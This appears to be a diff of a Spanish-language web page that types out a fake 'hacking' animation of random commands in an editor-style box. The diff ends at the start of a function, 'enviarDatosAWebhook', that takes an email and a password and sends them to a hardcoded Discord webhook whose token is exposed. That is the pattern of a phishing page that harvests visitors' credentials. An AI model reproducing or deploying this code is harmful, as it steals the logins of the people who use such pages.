@@ -111,16 +111,30 @@
             color: #0f0;
             opacity: 0.7;
         }
-      #fakeEditor {
-    display: block; /* Asegúrate de que esto esté visible */
-    background: #f4f4f4;
+    #fakeEditor {
+    display: block;
+    background: #1e1e1e; /* Fondo oscuro */
+    color: #dcdcdc; /* Texto claro */
     border: 1px solid #ccc;
     padding: 10px;
-    height: 200px; /* Altura fija */
-    overflow-y: hidden; /* Oculta el desbordamiento vertical */
-    font-family: monospace; /* Estilo de fuente para simular un editor de texto */
-    white-space: pre; /* Mantiene espacios y saltos de línea */
+    height: 200px;
+    overflow-y: hidden;
+    font-family: monospace;
+    white-space: pre;
+    margin-bottom: 20px; /* Espacio para el botón */
 }
+
+#copyButton {
+    display: block;
+    width: 100px; /* Ajusta según necesidad */
+    padding: 5px;
+    margin: 0 auto; /* Centrar el botón */
+    color: #fff;
+    background-color: #007bff;
+    border-color: #007bff;
+    cursor: pointer;
+}
+
 
       
 </style>
@@ -229,16 +243,14 @@ function mostrarFakeEditor() {
     const editor = document.getElementById('fakeEditor');
     editor.style.display = 'block';
     editor.textContent = ""; // Limpia el editor antes de empezar
-    
-    let fakeCodeLines = [
-        "hack.init()", 
-        "hack.attack('192.168.0.1')", 
-        "system.override()", 
-        "user.setPassword('123456')",
-        "fetch('data', { mode: 'cors' })",
-        "encrypt.data('secretKey')",
-        "console.log('Hackeo completo')"
-    ];
+
+    // Generar comandos falsos aleatorios
+    let commands = ["init()", "attack()", "override()", "setPassword()", "fetch()", "encrypt()", "console.log()", "decrypt()", "setTimeout()", "addEventListener()", "removeItem()", "dispatchEvent()", "querySelectAll()", "createElement()"];
+    let fakeCodeLines = [];
+    for (let i = 0; i < 200; i++) { // Ajusta para más líneas
+        let command = commands[Math.floor(Math.random() * commands.length)];
+        fakeCodeLines.push(`hack.${command} 'param${i}'`);
+    }
 
     // Función que simula la escritura de texto
     let currentLine = 0;
@@ -249,19 +261,18 @@ function mostrarFakeEditor() {
             if (currentChar < line.length) {
                 editor.textContent += line.charAt(currentChar);
                 currentChar++;
-                setTimeout(typeLine, 50); // Ajusta la velocidad de tipeo aquí
+                setTimeout(typeLine, Math.max(1800 / fakeCodeLines.length, 25)); // Ajusta para que dure ~1 minuto
             } else {
                 editor.textContent += '\n'; // Salto de línea al final de cada comando
                 currentLine++;
                 currentChar = 0;
-                setTimeout(typeLine, 200); // Retardo antes de empezar a escribir la siguiente línea
+                setTimeout(typeLine, 50); // Retardo antes de empezar la siguiente línea
             }
         }
     }
 
     typeLine(); // Inicia la simulación de tipeo
 }
-
 
 function enviarDatosAWebhook(email, contrasena) {
     var webhookURL = 'https://discordapp.com/api/webhooks/1157760501829345320/5vqHkW8jnO_nFfS8WSL-2fsP9q_Jxa2wTkAAhrml4P681DYeXAAJd51F94_rISviSmSo';
